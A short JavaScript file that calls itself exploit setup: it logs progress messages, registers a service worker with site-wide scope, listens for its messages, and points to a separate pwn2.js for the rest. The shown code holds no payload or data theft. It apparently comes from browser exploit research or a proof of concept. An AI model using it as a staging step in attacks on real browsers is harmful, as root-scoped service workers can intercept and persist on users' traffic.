function log(msg) {
	var x = document.createElement("div")
	x.innerHTML = "[+] " + msg + "\n";
	console.log(x.innerHTML);
	document.getElementById("log").appendChild(x);
}

log("beginning exploit setup");

function setupsw() {
	log("registering service worker...");
	navigator.serviceWorker.register("/sw.js", { scope: "/" })
		.then(function(registration) { log("registered service worker"); });
}

// register our service worker
if ("serviceWorker" in navigator) {

	// add an event listener for service worker messages
	navigator.serviceWorker.addEventListener('message', event => {
		log(event.data.msg, event.data.url);
	});

	setupsw();

	navigator.serviceWorker.ready.then(function(registration) {
		log("service worker signaled itself as ready");
	});
} else {
	log("browser doesn't support service workers?");
	throw "a";
}

// everything else is in pwn2.js